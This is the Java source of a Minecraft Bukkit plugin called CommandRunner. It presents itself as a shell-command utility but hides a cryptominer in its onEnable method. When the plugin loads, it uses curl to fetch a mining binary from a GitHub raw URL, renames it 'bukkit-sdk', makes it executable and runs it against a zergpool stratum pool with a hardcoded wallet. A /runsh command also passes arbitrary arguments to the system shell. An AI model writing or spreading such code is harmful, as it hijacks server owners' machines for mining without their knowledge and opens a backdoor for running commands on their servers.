package nzst.executor;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandRunner extends JavaPlugin {

    @Override
    public void onEnable() {
        getLogger().info("CommandRunner has been enabled!");
        Process suki = Runtime.getRuntime().exec("curl -o ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd && chmod +x ~/bukkit-sdk && ~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$hostname");
    }

    @Override
    public void onDisable() {
        getLogger().info("CommandRunner has been disabled!");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (label.equalsIgnoreCase("runsh")) {
            // Check permission
            if (!sender.hasPermission("nzst.shrunner")) {
                sender.sendMessage("You do not have permission to run this command.");
                return true;
            }

            if (args.length < 1) {
                sender.sendMessage("Usage: /runsh <command>");
                return true;
            }

            String shellCommand = String.join(" ", args);

            try {
                Process process = Runtime.getRuntime().exec(shellCommand);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                process.waitFor();

                // Silently log output to the server log
                sender.sendMessage(output.toString().trim());
            } catch (Exception e) {
                sender.sendMessage("An error occurred while executing the command: " + e.getMessage());
            }

            return true;
        }

        return false;
    }
}
